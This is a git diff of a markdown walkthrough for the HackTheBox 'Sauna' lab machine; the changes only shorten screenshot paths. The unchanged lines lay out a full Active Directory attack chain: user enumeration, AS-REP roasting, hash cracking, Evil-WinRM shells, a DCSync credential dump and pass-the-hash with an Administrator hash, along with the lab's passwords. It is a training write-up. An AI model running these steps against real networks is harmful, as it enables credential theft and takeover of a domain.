@@ -47,7 +47,7 @@ We start by verifying if the target is alive:
 ping -c 1 10.10.10.175
 ```
 
-![ping](cases/HackTheBox/Machines/EASY/Sauna/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming connectivity.
 
@@ -70,7 +70,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.175 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![allports](cases/HackTheBox/Machines/EASY/Sauna/screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -78,7 +78,7 @@ Extract open ports:
 extractPorts allports
 ```
 
-![extractports](cases/HackTheBox/Machines/EASY/Sauna/screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -97,7 +97,7 @@ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673
 - `-oN`: Output in human-readable format  
 
 
-![targeted](cases/HackTheBox/Machines/EASY/Sauna/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**
 
@@ -134,9 +134,9 @@ smbmap -H 10.10.10.175 -u none
 rpcclient -U "" 10.10.10.175 -N
 ```
 
-![crackmapexec](cases/HackTheBox/Machines/EASY/Sauna/screenshots/crackmapexec.png)
-![crackmapexec](cases/HackTheBox/Machines/EASY/Sauna/screenshots/crackmapexec_shares.png)
-![crackmapexec](cases/HackTheBox/Machines/EASY/Sauna/screenshots/rpcclient_null.png)
+![crackmapexec](screenshots/crackmapexec.png)
+![crackmapexec](screenshots/crackmapexec_shares.png)
+![crackmapexec](screenshots/rpcclient_null.png)
 
 No useful data obtained.
 
@@ -149,7 +149,7 @@ Query LDAP for naming contexts:
 ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts
 ```
 
-![ldapsearch_namingcontexts](cases/HackTheBox/Machines/EASY/Sauna/screenshots/ldapsearch_namingcontexts.png)
+![ldapsearch_namingcontexts](screenshots/ldapsearch_namingcontexts.png)
 
 Enumerating the domain:
 
@@ -163,7 +163,7 @@ Filtering for CN entries:
 ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' | grep "dn: CN="
 ```
 
-![ldapsearch_regex_clean](cases/HackTheBox/Machines/EASY/Sauna/screenshots/ldapsearch_regex_clean.png)
+![ldapsearch_regex_clean](screenshots/ldapsearch_regex_clean.png)
 
 We discover a user **Hugo Smith**.
 
@@ -186,7 +186,7 @@ Validate with Kerbrute:
 kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 users.txt 
 ```
 
-![kerbrute_users](cases/HackTheBox/Machines/EASY/Sauna/screenshots/kerbrute_users.png)
+![kerbrute_users](screenshots/kerbrute_users.png)
 
 The user **hsmith** is valid.
 
@@ -201,11 +201,11 @@ Browse the corporate site for additional username candidates beyond the initial 
 curl -i http://10.10.10.175/
 ```
 
-![web_team](cases/HackTheBox/Machines/EASY/Sauna/screenshots/web_team.png)
+![web_team](screenshots/web_team.png)
 
 Update the `users.txt` list and rerun Kerbrute:
 
-![kerbrute_users_updated](cases/HackTheBox/Machines/EASY/Sauna/screenshots/kerbrute_users_updated.png)
+![kerbrute_users_updated](screenshots/kerbrute_users_updated.png)
 
 We confirm the existence of **fsmith**.
 
@@ -218,7 +218,7 @@ Using Impacket:
 impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users -dc-ip 10.10.10.175
 ```
 
-![getnpusers_users](cases/HackTheBox/Machines/EASY/Sauna/screenshots/getnpusers_users.png)
+![getnpusers_users](screenshots/getnpusers_users.png)
 
 We obtain an AS-REP hash for `fsmith`.
 
@@ -231,7 +231,7 @@ Using Hashcat mode `18200` (Kerberos 5 AS-REP):
 hashcat -m 18200 -a 0 hash_fsmith /usr/share/wordlists/rockyou.txt 
 ```
 
-![hashcat_smith](cases/HackTheBox/Machines/EASY/Sauna/screenshots/hashcat_smith.png)
+![hashcat_smith](screenshots/hashcat_smith.png)
 
 Password found: **Thestrokes23**
 
@@ -245,7 +245,7 @@ crackmapexec smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
 crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
 ```
 
-![winrm_fsmith](cases/HackTheBox/Machines/EASY/Sauna/screenshots/winrm_fsmith.png)
+![winrm_fsmith](screenshots/winrm_fsmith.png)
 
 Login is successful.
 
@@ -258,7 +258,7 @@ We gain a shell with Evil-WinRM:
 evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
 ```
 
-![user_flag](cases/HackTheBox/Machines/EASY/Sauna/screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ðŸ **User flag obtained**
 
@@ -273,7 +273,7 @@ Check local groups:
 net localgroup "Remote Management Users"
 ```
 
-![user_rmu](cases/HackTheBox/Machines/EASY/Sauna/screenshots/user_rmu.png)
+![user_rmu](screenshots/user_rmu.png)
 
 We find another account: **svc_loanmgr**.
 
@@ -282,7 +282,7 @@ We find another account: **svc_loanmgr**.
 
 Upload and run `winPEAS.exe`:
 
-![winpeas_upload](cases/HackTheBox/Machines/EASY/Sauna/screenshots/winpeas_upload.png)
+![winpeas_upload](screenshots/winpeas_upload.png)
 
 ```powershell
 .\winPEASx64.exe
@@ -290,11 +290,11 @@ Upload and run `winPEAS.exe`:
 
 Credentials for `svc_loanmgr` are revealed:
 
-![winpeas_executed](cases/HackTheBox/Machines/EASY/Sauna/screenshots/winpeas_executed.png)
+![winpeas_executed](screenshots/winpeas_executed.png)
 
 Validate with CrackMapExec:
 
-![winrm_svc_loanmgr](cases/HackTheBox/Machines/EASY/Sauna/screenshots/winrm_svc_loanmgr.png)
+![winrm_svc_loanmgr](screenshots/winrm_svc_loanmgr.png)
 
 ---
 ### 4.3 Access as svc_loanmgr
@@ -306,7 +306,7 @@ Continue the attack chain with the next commands:
 evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
 ```
 
-![evil_winrm_svc_loanmgr](cases/HackTheBox/Machines/EASY/Sauna/screenshots/evil_winrm_svc_loanmgr.png)
+![evil_winrm_svc_loanmgr](screenshots/evil_winrm_svc_loanmgr.png)
 
 We now have access as `svc_loanmgr`.
 
@@ -315,7 +315,7 @@ We now have access as `svc_loanmgr`.
 
 Upload SharpHound:
 
-![sharphound_uploaded](cases/HackTheBox/Machines/EASY/Sauna/screenshots/sharphound_uploaded.png)
+![sharphound_uploaded](screenshots/sharphound_uploaded.png)
 
 Execute collection:
 
@@ -323,11 +323,11 @@ Execute collection:
 .\SharpHound.exe -c All --Domain EGOTISTICAL-BANK.LOCAL --DomainController 10.10.10.175 --ZipFileName sauna_bh.zip
 ```
 
-![sharphound_executed_true](cases/HackTheBox/Machines/EASY/Sauna/screenshots/sharphound_executed_true.png)
+![sharphound_executed_true](screenshots/sharphound_executed_true.png)
 
 Download the ZIP and analyze in BloodHound:
 
-![bh_file_uploaded](cases/HackTheBox/Machines/EASY/Sauna/screenshots/bh_zip_file.png)
+![bh_file_uploaded](screenshots/bh_zip_file.png)
 ![bh_file_uploaded](bh_file_uploaded.png)
 
 The path reveals that `svc_loanmgr` has **DCSync privileges**.
@@ -341,7 +341,7 @@ Dump credentials with Impacket:
 secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
 ```
 
-![secretsdump_svc_loanmgr](cases/HackTheBox/Machines/EASY/Sauna/screenshots/secretsdump_svc_loanmgr.png)
+![secretsdump_svc_loanmgr](screenshots/secretsdump_svc_loanmgr.png)
 
 We extract the **Administrator NTLM hash**.
 
@@ -354,7 +354,7 @@ Authenticate using Pass-the-Hash:
 impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 cmd.exe -hashes :823452073d75b9d1cf70ebdf86c7f98e
 ```
 
-![root_flag](cases/HackTheBox/Machines/EASY/Sauna/screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 ðŸ **Root flag obtained**
 
